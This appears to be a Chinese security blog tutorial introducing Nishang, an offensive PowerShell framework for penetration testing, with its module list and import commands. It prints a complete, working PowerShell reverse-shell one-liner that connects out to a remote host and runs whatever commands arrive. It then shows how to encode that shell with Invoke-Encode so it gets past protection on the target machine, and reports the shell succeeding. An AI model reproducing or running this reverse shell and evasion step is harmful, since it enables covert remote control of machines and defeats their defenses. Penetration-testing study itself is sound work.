**目录**

[Nishang](#t0 "Nishang")

[Nishang的目录结构](#t1 "Nishang的目录结构")

[Nishang的使用](#t2 "Nishang的使用")

[Invoke-Decode.ps1](#t3 "Invoke-Decode.ps1")

* * *

![](https://img-blog.csdnimg.cn/20191208151623232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Nishang
=======

Nishang是一个[PowerShell](https://so.csdn.net/so/search?q=PowerShell&spm=1001.2101.3001.7020)脚本和有效载荷的框架和集合，它使PowerShell能够用于攻击安全性、渗透测试和红队。它是基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包括下载和执行、键盘记录、DNS、延时命令等脚本，被广泛用于渗透测试的各个阶段。Nishang在PowerShell3.0及以上的环境中才能正常使用，所以Windows7、Server2008下默认是有点小问题的。项目地址：[GitHub - samratashok/nishang: Nishang - Offensive PowerShell for red team, penetration testing and offensive security.](https://github.com/samratashok/nishang "GitHub - samratashok/nishang: Nishang - Offensive PowerShell for red team, penetration testing and offensive security.")

**Nishang的目录结构**
----------------

![](https://img-blog.csdnimg.cn/20191208143749526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*   ActiveDirectory：活动目录
*   Antak-WebShell：WebShell
*   Backdoors：后门
*   Bypass：绕过
*   Client：客户端
*   Escalation：提权
*   Execution：执行
*   Gather：信息收集
*   MITM：
*   Misc：发音
*   Pivot：跳板、远程执行exe
*   Prasadhak：Virustotal 
*   Scan：扫描
*   Shells：shell
*   Utility：杂项
*   Powerpreter：Meterpreter会话

Nishang的使用
----------

导入所有的脚本到当前的PowerShell会话中(PowerShell v3之前)

```
Import-Module -verbose  .\nishang.psm1
```


![](https://img-blog.csdnimg.cn/20191217154110722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后输入命令：Get-Command -Module nishang   查看nishang有哪些功能

![](https://img-blog.csdnimg.cn/20191217154328516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Invoke-Decode.ps1

该脚本是Nishang的Utility目录下的，该脚本用于对payload进行编码。

![](https://img-blog.csdnimg.cn/20191206225823372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

例如，我们现在想利用powershell反弹shell。

我们在服务端使用powercat进行监听

![](https://img-blog.csdnimg.cn/2019120623015446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们在客户端的反弹shell的脚本如下，名为 reverse.ps1

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.10.1',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


但是由于客户端机器存在防护，直接指向该脚本反弹不了shell。所以，我们现在就利用 Invoke-Encode.ps1脚本对reverse.ps1进行编码。执行完成后，会生成两个文件：encoded.txt 和 encodedcommand.txt，前者是编码的数据，后者是编码后的命令。

```
Import-Module .\Invoke-Encode.ps1      
Invoke-Encode -DataToEncode .\reverse.ps1 -OutCommand
```


![](https://img-blog.csdnimg.cn/20191206230643955.png)

![](https://img-blog.csdnimg.cn/20191206230829572.png)

我们复制encodedcommand.txt 里面的命令，在powershell中执行，可以看到，反弹shell成功。

![](https://img-blog.csdnimg.cn/20191206231012630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

未完待续。。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)